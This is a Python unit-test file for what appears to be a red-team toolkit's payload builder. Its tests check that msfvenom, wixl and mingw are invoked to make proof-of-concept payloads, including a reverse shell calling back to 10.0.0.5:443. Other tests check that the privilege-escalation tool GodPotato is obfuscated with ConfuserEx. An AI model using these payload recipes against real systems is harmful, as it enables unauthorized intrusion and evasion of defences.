#!/usr/bin/env python3
"""The payload build layer — recipes over the operator's builders.

Pinned:

  * each format drives the right tool (msfvenom / wixl / gcc / mingw) with the right argv;
  * the default artifact runs a whoami/id *proof*; --lhost/--lport switch msfvenom to a
    reverse shell; --source compiles with mingw instead of msfvenom;
  * a missing builder or a nonzero compile comes back as ok=False (never raises), so the
    escalate loop can advance; have()/toolchain() report the toolchain honestly.

The builders are faked — no compiler is invoked.
"""
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from fieldkit import poc  # noqa: E402
from fieldkit.runner import RunResult  # noqa: E402


def capture(exit_code=0, error=None):
    """A fake run() that records argv and returns a canned RunResult."""
    seen = {}

    def run(argv):
        seen["argv"] = list(argv)
        return RunResult(argv, exit_code=exit_code, stdout="ok", error=error)
    return run, seen


class RecipeTest(unittest.TestCase):
    def setUp(self):
        self.wd = tempfile.mkdtemp()

    def test_msi_drives_wixl(self):
        run, seen = capture()
        r = poc.build("msi", "/out/e.msi", run=run, workdir=self.wd)
        self.assertTrue(r.ok)
        self.assertEqual(r.tool, "wixl")
        self.assertEqual(seen["argv"][:3], ["wixl", "-o", "/out/e.msi"])
        # the templated .wxs was written and carries the proof command
        wxs = open(os.path.join(self.wd, "p.wxs")).read()
        self.assertIn("whoami", wxs)

    def test_so_drives_gcc(self):
        run, seen = capture()
        r = poc.build("so", "/out/p.so", run=run, workdir=self.wd)
        self.assertEqual(r.tool, "gcc")
        self.assertIn("-shared", seen["argv"])
        self.assertIn("id", open(os.path.join(self.wd, "p.c")).read())

    def test_exe_defaults_to_msfvenom_exec_proof(self):
        run, seen = capture()
        r = poc.build("exe", "/out/p.exe", command="cmd /c whoami", run=run, workdir=self.wd)
        self.assertEqual(r.tool, "msfvenom")
        self.assertIn("windows/x64/exec", seen["argv"])
        self.assertIn("CMD=cmd /c whoami", seen["argv"])
        self.assertEqual(seen["argv"][-2:], ["-o", "/out/p.exe"])

    def test_lhost_lport_switch_to_reverse_shell(self):
        run, seen = capture()
        poc.build("exe", "/out/p.exe", lhost="10.0.0.5", lport="443", run=run, workdir=self.wd)
        self.assertIn("windows/x64/shell_reverse_tcp", seen["argv"])
        self.assertIn("LHOST=10.0.0.5", seen["argv"])
        self.assertIn("LPORT=443", seen["argv"])

    def test_x86_arch_selects_32bit_payload(self):
        run, seen = capture()
        poc.build("exe", "/out/p.exe", arch="x86", run=run, workdir=self.wd)
        self.assertIn("windows/exec", seen["argv"])       # no /x64/

    def test_dll_is_shared_when_built_from_source(self):
        run, seen = capture()
        r = poc.build("dll", "/out/p.dll", source="/src/p.c", arch="x64",
                      run=run, workdir=self.wd)
        self.assertEqual(r.tool, "x86_64-w64-mingw32-gcc")
        self.assertIn("-shared", seen["argv"])
        self.assertIn("/src/p.c", seen["argv"])


class FailureTest(unittest.TestCase):
    def test_missing_builder_is_not_ok(self):
        run, _ = capture(error="wixl: not found — is it installed?")
        r = poc.build("msi", "/out/e.msi", run=run, workdir=tempfile.mkdtemp())
        self.assertFalse(r.ok)
        self.assertIn("not found", r.detail)

    def test_nonzero_compile_is_not_ok(self):
        run, _ = capture(exit_code=1)
        r = poc.build("so", "/out/p.so", run=run, workdir=tempfile.mkdtemp())
        self.assertFalse(r.ok)
        self.assertIn("exited 1", r.detail)

    def test_unknown_format(self):
        r = poc.build("apk", "/out/p.apk")
        self.assertFalse(r.ok)
        self.assertIn("unknown format", r.detail)


class ToolchainTest(unittest.TestCase):
    def test_have_matches_which(self):
        import shutil
        self.assertEqual(poc.have("msi"), bool(shutil.which("wixl")))

    def test_toolchain_lists_every_builder(self):
        tools = [t for t, _ in poc.toolchain()]
        for t in ("msfvenom", "wixl", "gcc"):
            self.assertIn(t, tools)


class ConfuserTest(unittest.TestCase):
    """ConfuserEx obfuscation orchestration — the CLI is faked, none is invoked."""

    def setUp(self):
        self.wd = tempfile.mkdtemp()
        self.src = os.path.join(self.wd, "GodPotato.exe")
        with open(self.src, "w") as fh:
            fh.write("MZ")

    def _fake_confuser(self, produce=True):
        """A fake run() that emulates ConfuserEx: read the .crproj, write outputDir/module."""
        seen = {}

        def run(argv):
            seen["argv"] = argv
            proj = argv[-1]
            import re
            outdir = re.search(r'outputDir="([^"]+)"', open(proj).read()).group(1)
            if produce:
                os.makedirs(outdir, exist_ok=True)
                with open(os.path.join(outdir, "GodPotato.exe"), "w") as fh:
                    fh.write("OBFUSCATED")
            return RunResult(argv, exit_code=0, stdout="done")
        return run, seen

    def test_obfuscate_drives_cli_with_a_generated_crproj(self):
        run, seen = self._fake_confuser()
        out = os.path.join(self.wd, "god-obf.exe")
        res = poc.obfuscate(self.src, out, cli="/opt/ConfuserEx/Confuser.CLI", run=run)
        self.assertTrue(res.ok, res.detail)
        self.assertEqual(res.tool, "ConfuserEx")
        self.assertEqual(seen["argv"][0], "/opt/ConfuserEx/Confuser.CLI")   # native CLI, no mono
        self.assertTrue(seen["argv"][-1].endswith(".crproj"))
        self.assertEqual(open(out).read(), "OBFUSCATED")                    # moved to out

    def test_missing_input_is_not_ok(self):
        run, _ = self._fake_confuser()
        res = poc.obfuscate("/no/such.exe", os.path.join(self.wd, "o.exe"),
                            cli="/opt/Confuser.CLI", run=run)
        self.assertFalse(res.ok)
        self.assertIn("input not found", res.detail)

    def test_no_cli_is_a_clean_failure_not_a_crash(self):
        run, _ = self._fake_confuser()
        # an unresolved CLI (empty override, nothing on PATH in CI) fails gracefully
        res = poc.obfuscate(self.src, os.path.join(self.wd, "o.exe"), cli=None, run=run)
        self.assertFalse(res.ok)
        self.assertIn("ConfuserEx", res.detail)

    def test_cli_ran_but_no_output(self):
        run, _ = self._fake_confuser(produce=False)
        res = poc.obfuscate(self.src, os.path.join(self.wd, "o.exe"),
                            cli="/opt/Confuser.CLI", run=run)
        self.assertFalse(res.ok)
        self.assertIn("no output", res.detail)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
